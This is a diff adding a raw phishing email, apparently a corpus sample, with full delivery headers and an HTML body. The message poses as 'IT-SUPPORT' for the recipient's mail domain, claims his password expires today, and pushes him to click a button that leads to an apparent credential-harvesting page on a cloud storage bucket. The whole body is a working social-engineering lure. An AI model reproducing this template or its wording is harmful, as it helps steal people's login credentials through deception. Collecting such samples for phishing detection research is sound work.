@@ -1,0 +1,118 @@
+Return-Path: office@ksr-group.com
+Delivered-To: jose@monkey.org
+X-FDA: 84119685846.11.4462888
+Received: from server.najrnatuae.store (server.najrnatuae.store [45.93.8.89])
+	by imf25.b.hostedemail.com (Postfix) with ESMTP id 57459120003
+	for <jose@monkey.org>; Mon, 17 Nov 2025 10:13:02 +0000 (UTC)
+Authentication-Results: imf25.b.hostedemail.com;
+	spf=softfail (imf25.b.hostedemail.com: 45.93.8.89 is neither permitted nor
+ denied by domain of office@ksr-group.com) smtp.mailfrom=office@ksr-group.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1763374382;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references; bh=qLPMqh0/XogQdn1bBdtlLfzDv5qRvZzF9o9jL2PHiaw=;
+	b=SP8Kqd341EK5/VuF5LFsvrTQNTJc2s3R4oKo8CWwOHvuGVf3dyvCYk6lXXZFjM/CbMOO5W
+	AyyseQzO1cd7fPdEXWABG7WVU2fuu1BRKhKdg/Lce3CV7Mt309tNs6aCKlzcmkAK8x+Nx+
+	yVmWdoIIsEupe+ikZvbf0SK3PDlOv0g=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1763374382; a=rsa-sha256;
+	cv=none;
+	b=Nh7aaYnIDZR28rClHXs2MGqqWuxWKVXf8HICy5TdyxV3S9J9R8LrJosp/QDC1ryvRzphks
+	MoIHKQK4mj7Q6xIIOE2kTpgV8c/cPkVSa0nOdjfghjD9a5r4o1hNcQYm9kRr8LYu4ssyGk
+	NyFBqdft1Xx01PwWMwlI9hofH2/L8II=
+ARC-Authentication-Results: i=1;
+	imf25.b.hostedemail.com;
+	dkim=none;
+	spf=softfail (imf25.b.hostedemail.com: 45.93.8.89 is neither permitted nor
+ denied by domain of office@ksr-group.com) smtp.mailfrom=office@ksr-group.com;
+	dmarc=none
+Received: from server.najrnatuae.store (localhost [127.0.0.1])
+	by server.najrnatuae.store (Postfix) with ESMTPS id 04818802BE
+	for <jose@monkey.org>; Mon, 17 Nov 2025 09:53:52 +0000 (UTC)
+From: "IT-SUPPORT"<office@ksr-group.com>
+To: jose@monkey.org
+Subject: Note 2025: You must update your login details,
+ otherwise you will lose access.
+Date: 17 Nov 2025 10:53:52 +0100
+Message-ID: <20251117105352.FDB04989E5883AD3@ksr-group.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspam-User: 
+X-Rspamd-Server: rspam05
+X-Rspamd-Queue-Id: 57459120003
+X-Stat-Signature: eajbzz1n9m9gux7amx6gzre6rcb3sca7
+X-Spam-Status: Yes, score=18.90
+X-HE-Tag: 1763374382-652213
+X-HE-Meta: 
+ U2FsdGVkX1/ajH+zg8VuTfnp3dMrHO960o8Ui6chosoOLzCiMVE+RkD23dcd8WbLD1jcpfv4Hb2cM8EGh6q8GSlGRVOsUPBNuIN9Dc1dFVM3I8xdRGaIi0xiQC0GpAzq1OlaEAKKh6WWUjYJc9l8JtmXl+guDziwCnnK13dJr2dByuw/JiCg4Q/SSPyVOulRh/yN8q9HwwqPDlzmOBepJ5LH07fFaa3QVYpNqMHVOp6gO7KfPrJEIA9jaJqI2cZMPnVwE2yQnH37ZRaQoCxjFd5SOfXiYvAPG3uLQ3Y8Mp46nEXogiJL22EA60X7GgPbWy99uwhnIEstY3qZ476hWxQMN7DthqXJbZDfwLabcfGKWq9dX5YVDbOWv5r9Hopyd+eyN0/IN/LonRhsZt0SFrkKcNfW/rMwEhSgb18k+ds3aojSccAzI91dftz8fna5nU2EhMnpMsaSP225FO4xOsyuKv/fezFY8vF+exrHDrnCE+1wqeFn37r+0ArVSPX7OjrgGiZtYBcDiRl3O9FpH0A/RCuosmRE/4EgRIfwF1XrQ15SPVtRrY2gsTVpUL41PqRW4FIKZ+pPyR8M/h8COY0LIhmSpKyALBVDklzHJlzDDWPJnyIO03Bg2oy8p/2TSI3WkNM923PCzG/IWbzj3n5wW2m1/IGj8uxpF1rjmn+griws8ifTA/VrTmKjDDuucX9jd0hnswQa+1kYY7f4EM6R3b0l/zPj8KK2RMpIaEy7QBQv/gkGsRCuV2TDXoXxn7sZDL/VIRfHd5V8KjDgvKZsjTrbRr/VAuSo7/7DwOy5Kd2KwgcNcDOoiJYKo7MZVb2gtejn94+Kw5flo4+wTo9Dsw2D2pxwdndb55FXquQ8o3vihrtGob4ZFuNa5Udie36TRAWUMZB1wbWMK0L7Xc3pmS2p462qbqN3kVVx15f+p+bFZwbDED1mhR8ANQIfLZXTBHTuelbjSbORKWn1iNFocDt
+ OwHlDn0sQYVKmo7V979I4W/88bwHB0Yb3poAX91f7BBgITxIas2+ZdzKcrWO1LuMHt2todrV+4gKVBBEHvhBr+jrfjPdXSECcoS7aknsElCWn5krJBZOFS2q4kOVGGNOW6bZA1tHGYW4CrgCvm/zgPFK2u8MkyblEGZxyXRmq/JC1nDtNhhpWc3/pyjI8PJD1JQObOwMtoWQ74P2hA5/QFe6io521/dKVyMW/pBcrmk6mgDllEuiAz0RjLbx8PpChxFjvuc4wuzknkt5GY9iniPjEG2SHoqmMMtaQ4k02T0rel2baIqeQlEzSKYssT/abmp5zQTxQ268mbDyr98/dFqOHuvpY3COWM2gqMdtCVFACzw67H26pkTbtDFnV4ojiz9IY
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 437
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<table align=3D"center" style=3D'width: 602px; height: 365px; color: rgb(32=
+, 31, 30); text-transform: none; text-indent: 0px; letter-spacing: normal; =
+font-family: "Times New Roman"; font-size: 15px; font-style: normal; font-w=
+eight: 400; word-spacing: 0px; white-space: normal; border-collapse: collap=
+se; orphans: 2; widows: 2; font-stretch: inherit; background-color: green; =
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color:
+initial; font-variant-ligatures: normal; font-variant-caps: normal; font-va=
+riant-numeric: inherit; font-variant-east-asian: inherit;'><tbody><tr style=
+=3D"height: 346px;"><td align=3D"center" style=3D'margin: 0px; width: 600px=
+; height: 346px; color: rgb(73, 83, 97); padding-top: 24px; font-family: "S=
+egoe UI", Helvetica, Arial, sans-serif; font-size: 12px;'><table align=3D"c=
+enter" style=3D"width: 600px; border-collapse: collapse;"><tbody><tr>
+<td style=3D"margin: 0px; padding: 24px; background-color: rgb(255, 255, 25=
+5);"><h1 _msthash=3D"0" _msttexthash=3D"173355">monkey.org&nbsp;</h1><p><sp=
+an class=3D"v1jCAhz v1ChMk0b"><span class=3D"v1ryNqvb" _msthash=3D"1" _mstt=
+exthash=3D"171366">Hi jose</span></span></p><p><span class=3D"v1jCAhz v1ChM=
+k0b"><span class=3D"v1ryNqvb" _msthash=3D"2" _msttexthash=3D"9827545">Your =
+jose@monkey.org account password expires today 11/17/2025 10:53:52 a.m., so=
+ you may not be able to access your inbox or send and receive new messages.=
+</span>
+</span></p><p><span class=3D"v1jCAhz v1ChMk0b"><span class=3D"v1ryNqvb" _ms=
+thash=3D"3" _msttexthash=3D"1494493">Click below to continue using the same=
+ password</span></span></p><br><p style=3D"border-width: 0px; margin: 0px; =
+padding: 0px; line-height: normal; font-size: 1em; vertical-align: baseline=
+;">
+<a style=3D'background: green; border-width: 0px; margin: 2px; padding: 10p=
+x; border-radius: 3px; color: rgb(255, 250, 250); line-height: normal; font=
+-family: "Trebuchet MS", Helvetica, sans-serif; font-size: 14px; vertical-a=
+lign: baseline; float: left; display: block; font-stretch: inherit; text-de=
+coration-line: none;' href=3D"https://mail-settings-update-par.s3.eu-centra=
+l-3.ionoscloud.com/k_linkn.html?eta=3Djose@monkey.org" target=3D"_blank" re=
+l=3D"noreferrer" _msthash=3D"4" _msttexthash=3D"811057">
+Continue to use the same password</a></p><p style=3D"border-width: 0px; mar=
+gin: 0px; padding: 0px; line-height: normal; font-size: 1em; vertical-align=
+: baseline;">&nbsp;</p><p style=3D"border-width: 0px; margin: 0px; padding:=
+ 0px; line-height: normal; font-size: 1em; vertical-align: baseline;">&nbsp=
+;</p><p style=3D"border-width: 0px; margin: 0px; padding: 0px; line-height:=
+ normal; font-size: 1em; vertical-align: baseline;">&nbsp;</p>
+<p style=3D"border-width: 0px; margin: 0px; padding: 0px; line-height: norm=
+al; font-size: 1em; vertical-align: baseline;" _msthash=3D"5" _msttexthash=
+=3D"2914912">After verification, you will be redirected to http://www. monk=
+ey.org</p></td></tr></tbody></table></td></tr><tr style=3D"height: 19px;"><=
+td style=3D"margin: 0px; width: 600px; height: 19px; line-height: normal; f=
+ont-size: 1em;">&nbsp;</td></tr></tbody></table></body></html>
+
+
+
+
+
+
+
+
+
+
+
+
